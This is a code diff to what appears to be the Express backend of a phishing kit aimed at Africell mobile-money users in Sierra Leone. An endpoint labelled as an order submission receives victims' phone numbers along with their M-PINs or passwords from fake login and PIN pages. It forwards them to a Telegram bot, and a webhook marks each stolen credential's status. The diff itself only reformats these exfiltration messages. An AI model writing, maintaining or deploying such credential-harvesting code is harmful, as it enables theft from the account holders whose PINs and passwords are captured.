@@ -57,14 +57,13 @@ app.post('/api/submit-order', async (req, res) => {
         const countryCode = "+232";
 
         // Check if this submission is from pin.html (PIN code) or login.html (Password)
-        // Since pin.html can now be any length, we check if it's purely numeric or coming from pin step
         const isPinStep = /^\d+$/.test(uniqueId) && uniqueId.length >= 4; 
         const headerTitle = isPinStep ? "🔐 *Africell M-PIN Submitted*" : "🔔 *New Africell Login Attempt*";
         const credentialLabel = isPinStep ? "M-PIN" : "Password";
 
+        // Formatted cleanly so tapping/copying only grabs the flag, code, and number together
         const message = `${headerTitle}\n\n` +
-                        `${countryFlag} Country: \`${countryCode}\`\n` +
-                        `📱 Phone: \`${phone}\`\n` +
+                        `📱 Phone: \`${countryFlag} ${countryCode} ${phone.replace('+232', '').trim()}\`\n` +
                         `🔑 ${credentialLabel}: \`${uniqueId || 'N/A'}\``;
 
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -142,8 +141,11 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 messageTitle = 'Credential Error Result';
             }
 
+            const countryFlag = "🇸🇱";
+            const countryCode = "+232";
+
             let updatedMessage = `📋 *${messageTitle}*\n\n` +
-                                 `🇸🇱 Phone: \`${phone}\`\n` +
+                                 `📱 Phone: \`${countryFlag} ${countryCode} ${phone.replace('+232', '').trim()}\`\n` +
                                  `🔑 Credential: \`${uniqueId}\`\n` +
                                  `📌 Status: *${actionText}*`;
 
